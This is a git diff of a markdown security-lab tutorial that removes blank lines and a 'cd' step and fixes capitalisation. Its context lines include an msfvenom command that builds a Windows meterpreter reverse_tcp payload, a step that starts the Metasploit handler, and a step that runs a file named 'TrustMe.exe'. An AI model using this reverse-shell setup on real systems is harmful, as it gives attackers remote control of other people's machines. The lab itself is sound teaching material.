@@ -85,17 +85,10 @@ msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[You
 
 Let's start the **Metasploit** Handler. We need another **Linux Terminal**
 
-
-
 - **Double-click** `Ubuntu Shell` on Desktop
 
 <img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />
 
-
-
-```bash
-cd ~/Desktop
-```
 
 Now let's start the **Metasploit** Handler
 
@@ -156,7 +149,7 @@ It should look like this:
 <img width="598" height="354" alt="2026-03-13_16-37" src="https://github.com/user-attachments/assets/d8175d3c-e72a-4d57-bdd6-65409afb838a" />
 
 
-let's run the following commands to run the **"TrustMe.exe"** file.
+Let's run the following commands to run the **"TrustMe.exe"** file.
 
 ```cmd
 cd \Users\Administrator\Desktop
